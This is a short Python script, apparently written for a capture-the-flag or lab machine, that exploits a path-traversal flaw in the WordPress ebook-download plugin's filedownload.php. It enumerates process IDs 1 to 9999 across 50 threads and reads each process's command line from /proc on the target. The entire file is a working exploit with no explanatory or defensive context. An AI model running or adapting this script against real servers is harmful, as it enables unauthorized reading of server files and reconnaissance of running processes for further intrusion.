#!/usr/bin/python3
import requests, os
from concurrent.futures import ThreadPoolExecutor

url = "http://10.10.11.125"
os.system('seq 1 9999 > ids')
cont = open('ids','r').readlines()

def b(f):
	r = requests.get(url + '/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../proc/' + f.strip() + '/cmdline')
	print(r.text.split('../')[24].split('cmdline')[1].split('<script>')[0])
with ThreadPoolExecutor(max_workers=50) as ex:
	ex.map(b,cont)